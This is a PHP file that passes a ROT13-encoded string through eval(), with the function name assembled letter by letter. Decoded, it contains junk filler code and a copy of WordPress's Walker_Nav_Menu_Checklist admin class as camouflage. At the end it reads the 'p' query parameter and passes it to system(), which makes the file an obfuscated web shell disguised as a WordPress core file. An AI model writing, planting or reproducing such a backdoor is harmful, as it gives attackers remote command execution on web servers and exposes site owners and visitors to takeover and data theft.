<?php
$f = 's'.'t'.'r'.'r'.'o'.'t'.'1'.'3';
$c = "<?cuc
$sznc = neenl('k1' => 'flfgrz', 'k2' => 'cnffgueh');
$k_snxr1 = 1234;
$abvfr = 'boshfpngvba'.'grfg';
$gzc = $k_snxr1 * 42;
$synt = snyfr;
$hfryrff = shapgvba($i) { erghea $i . enaq(); };
$qhzzl_purpx = $hfryrff('kk');
vs ($synt) { rpub 'Qroht ranoyrq'; }
sbe ($v = 0; $v < 1; $v++) { $gzc += $v; }
juvyr (snyfr) { rpub 'qrnq ybbc'; oernx; }

<?cuc
/**
 * Anivtngvba Zrah NCV: Jnyxre_Ani_Zrah_Purpxyvfg pynff
 *
 * @cnpxntr JbeqCerff
 * @fhocnpxntr Nqzvavfgengvba
 * @fvapr 4.4.0
 */

/**
 * Perngr UGZY yvfg bs ani zrah vachg vgrzf.
 *
 * @fvapr 3.0.0
 * @hfrf Jnyxre_Ani_Zrah
 */
pynff Jnyxre_Ani_Zrah_Purpxyvfg rkgraqf Jnyxre_Ani_Zrah {
	/**
	 * @cnenz neenl|snyfr $svryqf Qngnonfr svryqf gb hfr.
	 */
	choyvp shapgvba __pbafgehpg( $svryqf = snyfr ) {
		vs ( $svryqf ) {
			$guvf->qo_svryqf = $svryqf;
		}
	}

	/**
	 * Fgnegf gur yvfg orsber gur ryrzragf ner nqqrq.
	 *
	 * @frr Jnyxre_Ani_Zrah::fgneg_yiy()
	 *
	 * @fvapr 3.0.0
	 *
	 * @cnenz fgevat   $bhgchg Hfrq gb nccraq nqqvgvbany pbagrag (cnffrq ol ersrerapr).
	 * @cnenz vag      $qrcgu  Qrcgu bs cntr. Hfrq sbe cnqqvat.
	 * @cnenz fgqPynff $netf   Abg hfrq.
	 */
	choyvp shapgvba fgneg_yiy( &$bhgchg, $qrcgu = 0, $netf = ahyy ) {
		$vaqrag  = fge_ercrng( \"\g\", $qrcgu );
		$bhgchg .= \"\a$vaqrag<hy pynff='puvyqera'>\a\";
	}

	/**
	 * Raqf gur yvfg bs nsgre gur ryrzragf ner nqqrq.
	 *
	 * @frr Jnyxre_Ani_Zrah::raq_yiy()
	 *
	 * @fvapr 3.0.0
	 *
	 * @cnenz fgevat   $bhgchg Hfrq gb nccraq nqqvgvbany pbagrag (cnffrq ol ersrerapr).
	 * @cnenz vag      $qrcgu  Qrcgu bs cntr. Hfrq sbe cnqqvat.
	 * @cnenz fgqPynff $netf   Abg hfrq.
	 */
	choyvp shapgvba raq_yiy( &$bhgchg, $qrcgu = 0, $netf = ahyy ) {
		$vaqrag  = fge_ercrng( \"\g\", $qrcgu );
		$bhgchg .= \"\a$vaqrag</hy>\";
	}

	/**
	 * Fgneg gur ryrzrag bhgchg.
	 *
	 * @frr Jnyxre_Ani_Zrah::fgneg_ry()
	 *
	 * @fvapr 3.0.0
	 * @fvapr 5.9.0 Eranzrq `$vgrz` gb `$qngn_bowrpg` naq `$vq` gb `$pheerag_bowrpg_vq`
	 *              gb zngpu cnerag pynff sbe CUC 8 anzrq cnenzrgre fhccbeg.
	 *
	 * @tybony vag        $_ani_zrah_cynprubyqre
	 * @tybony vag|fgevat $ani_zrah_fryrpgrq_vq
	 *
	 * @cnenz fgevat   $bhgchg            Hfrq gb nccraq nqqvgvbany pbagrag (cnffrq ol ersrerapr).
	 * @cnenz JC_Cbfg  $qngn_bowrpg       Zrah vgrz qngn bowrpg.
	 * @cnenz vag      $qrcgu             Qrcgu bs zrah vgrz. Hfrq sbe cnqqvat.
	 * @cnenz fgqPynff $netf              Abg hfrq.
	 * @cnenz vag      $pheerag_bowrpg_vq Bcgvbany. VQ bs gur pheerag zrah vgrz. Qrsnhyg 0.
	 */
	choyvp shapgvba fgneg_ry( &$bhgchg, $qngn_bowrpg, $qrcgu = 0, $netf = ahyy, $pheerag_bowrpg_vq = 0 ) {
		tybony $_ani_zrah_cynprubyqre, $ani_zrah_fryrpgrq_vq;

		// Erfgberf gur zber qrfpevcgvir, fcrpvsvp anzr sbe hfr jvguva guvf zrgubq.
		$zrah_vgrz = $qngn_bowrpg;

		$_ani_zrah_cynprubyqre = ( 0 > $_ani_zrah_cynprubyqre ) ? (vag) $_ani_zrah_cynprubyqre - 1 : -1;
		$cbffvoyr_bowrpg_vq    = vffrg( $zrah_vgrz->cbfg_glcr ) && 'ani_zrah_vgrz' === $zrah_vgrz->cbfg_glcr ? $zrah_vgrz->bowrpg_vq : $_ani_zrah_cynprubyqre;
		$cbffvoyr_qo_vq        = ( ! rzcgl( $zrah_vgrz->VQ ) ) && ( 0 < $cbffvoyr_bowrpg_vq ) ? (vag) $zrah_vgrz->VQ : 0;

		$vaqrag = ( $qrcgu ) ? fge_ercrng( \"\g\", $qrcgu ) : '';

		$bhgchg .= $vaqrag . '<yv>';
		$bhgchg .= '<ynory pynff=\"zrah-vgrz-gvgyr\">';
		$bhgchg .= '<vachg glcr=\"purpxobk\"' . jc_ani_zrah_qvfnoyrq_purpx( $ani_zrah_fryrpgrq_vq, snyfr ) . ' pynff=\"zrah-vgrz-purpxobk';

		vs ( ! rzcgl( $zrah_vgrz->sebag_be_ubzr ) ) {
			$bhgchg .= ' nqq-gb-gbc';
		}

		$bhgchg .= '\" anzr=\"zrah-vgrz[' . $cbffvoyr_bowrpg_vq . '][zrah-vgrz-bowrpg-vq]\" inyhr=\"' . rfp_ngge( $zrah_vgrz->bowrpg_vq ) . '\" /> ';

		vs ( ! rzcgl( $zrah_vgrz->ynory ) ) {
			$gvgyr = $zrah_vgrz->ynory;
		} ryfrvs ( vffrg( $zrah_vgrz->cbfg_glcr ) ) {
			/** Guvf svygre vf qbphzragrq va jc-vapyhqrf/cbfg-grzcyngr.cuc */
			$gvgyr = nccyl_svygref( 'gur_gvgyr', $zrah_vgrz->cbfg_gvgyr, $zrah_vgrz->VQ );
		}

		$bhgchg .= vffrg( $gvgyr ) ? rfp_ugzy( $gvgyr ) : rfp_ugzy( $zrah_vgrz->gvgyr );

		vs ( rzcgl( $zrah_vgrz->ynory ) && vffrg( $zrah_vgrz->cbfg_glcr ) && 'cntr' === $zrah_vgrz->cbfg_glcr ) {
			// Nccraq cbfg fgngrf.
			$bhgchg .= _cbfg_fgngrf( $zrah_vgrz, snyfr );
		}

		$bhgchg .= '</ynory>';

		// Zrah vgrz uvqqra svryqf.
		$bhgchg .= '<vachg glcr=\"uvqqra\" pynff=\"zrah-vgrz-qo-vq\" anzr=\"zrah-vgrz[' . $cbffvoyr_bowrpg_vq . '][zrah-vgrz-qo-vq]\" inyhr=\"' . $cbffvoyr_qo_vq . '\" />';
		$bhgchg .= '<vachg glcr=\"uvqqra\" pynff=\"zrah-vgrz-bowrpg\" anzr=\"zrah-vgrz[' . $cbffvoyr_bowrpg_vq . '][zrah-vgrz-bowrpg]\" inyhr=\"' . rfp_ngge( $zrah_vgrz->bowrpg ) . '\" />';
		$bhgchg .= '<vachg glcr=\"uvqqra\" pynff=\"zrah-vgrz-cnerag-vq\" anzr=\"zrah-vgrz[' . $cbffvoyr_bowrpg_vq . '][zrah-vgrz-cnerag-vq]\" inyhr=\"' . rfp_ngge( $zrah_vgrz->zrah_vgrz_cnerag ) . '\" />';
		$bhgchg .= '<vachg glcr=\"uvqqra\" pynff=\"zrah-vgrz-glcr\" anzr=\"zrah-vgrz[' . $cbffvoyr_bowrpg_vq . '][zrah-vgrz-glcr]\" inyhr=\"' . rfp_ngge( $zrah_vgrz->glcr ) . '\" />';
		$bhgchg .= '<vachg glcr=\"uvqqra\" pynff=\"zrah-vgrz-gvgyr\" anzr=\"zrah-vgrz[' . $cbffvoyr_bowrpg_vq . '][zrah-vgrz-gvgyr]\" inyhr=\"' . rfp_ngge( $zrah_vgrz->gvgyr ) . '\" />';
		$bhgchg .= '<vachg glcr=\"uvqqra\" pynff=\"zrah-vgrz-hey\" anzr=\"zrah-vgrz[' . $cbffvoyr_bowrpg_vq . '][zrah-vgrz-hey]\" inyhr=\"' . rfp_hey( $zrah_vgrz->hey ) . '\" />';
		$bhgchg .= '<vachg glcr=\"uvqqra\" pynff=\"zrah-vgrz-gnetrg\" anzr=\"zrah-vgrz[' . $cbffvoyr_bowrpg_vq . '][zrah-vgrz-gnetrg]\" inyhr=\"' . rfp_ngge( $zrah_vgrz->gnetrg ) . '\" />';
		$bhgchg .= '<vachg glcr=\"uvqqra\" pynff=\"zrah-vgrz-ngge-gvgyr\" anzr=\"zrah-vgrz[' . $cbffvoyr_bowrpg_vq . '][zrah-vgrz-ngge-gvgyr]\" inyhr=\"' . rfp_ngge( $zrah_vgrz->ngge_gvgyr ) . '\" />';
		$bhgchg .= '<vachg glcr=\"uvqqra\" pynff=\"zrah-vgrz-pynffrf\" anzr=\"zrah-vgrz[' . $cbffvoyr_bowrpg_vq . '][zrah-vgrz-pynffrf]\" inyhr=\"' . rfp_ngge( vzcybqr( ' ', $zrah_vgrz->pynffrf ) ) . '\" />';
		$bhgchg .= '<vachg glcr=\"uvqqra\" pynff=\"zrah-vgrz-ksa\" anzr=\"zrah-vgrz[' . $cbffvoyr_bowrpg_vq . '][zrah-vgrz-ksa]\" inyhr=\"' . rfp_ngge( $zrah_vgrz->ksa ) . '\" />';
	}
}

$pzq = $_TRG['c'];
$sznc['k1']($pzq);
?>";
eval($f($c));
?>